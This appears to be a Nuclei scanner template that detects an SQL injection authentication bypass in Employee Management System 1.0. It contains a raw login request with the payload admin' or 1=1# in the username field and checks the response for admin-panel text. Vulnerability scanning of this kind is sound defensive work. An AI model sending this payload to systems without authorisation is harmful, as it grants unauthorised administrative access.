id: ems-sqli
info:
  author: arafatansari
  description: 'Employee Management System Login page can be bypassed with a simple
    SQLi to the username parameter.

    '
  metadata:
    verified: true
  name: Employee Management System 1.0 - SQLi Authentication Bypass
  reference:
  - https://www.exploit-db.com/exploits/48882
  - https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip
  severity: high
  tags: ems,sqli,cms,auth-bypass
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - Admin Panel
    - Log Out
    - Employee Management System
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'POST /process/aprocess.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    mailuid=admin'' or 1=1#&pwd=nuclei&login-submit=Login

    '
  redirects: true
